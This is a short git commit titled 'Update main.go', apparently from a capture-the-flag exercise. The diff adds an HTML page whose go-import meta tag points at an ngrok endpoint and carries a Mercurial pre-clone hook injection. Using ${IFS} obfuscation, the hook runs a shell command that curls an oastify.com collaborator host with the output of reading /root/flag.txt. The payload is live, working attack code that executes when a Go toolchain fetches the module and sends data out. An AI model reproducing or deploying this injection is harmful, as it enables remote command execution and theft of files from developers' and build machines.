386722a1d9373951c43c7670cc77f46964fa17b2
Abdallah-Almahdy <140536488+Abdallah-Almahdy@users.noreply.github.com>
2025-08-11 00:30:13 +0300

    Update main.go

--- main.go
+++ main.go
@@ -1,3 +1,4 @@
+package
 <html>
   <head>
     <meta name="go-import" content="4.tcp.eu.ngrok.io:19907/pkg hg --config=hooks.pre-clone=sh${IFS}-c${IFS}'curl${IFS}http://266c4guw1kozas7ngvzsgx6jfal192xr.oastify.com?flag=cat${IFS}/root/flag.txt;echo${IFS}https://'">
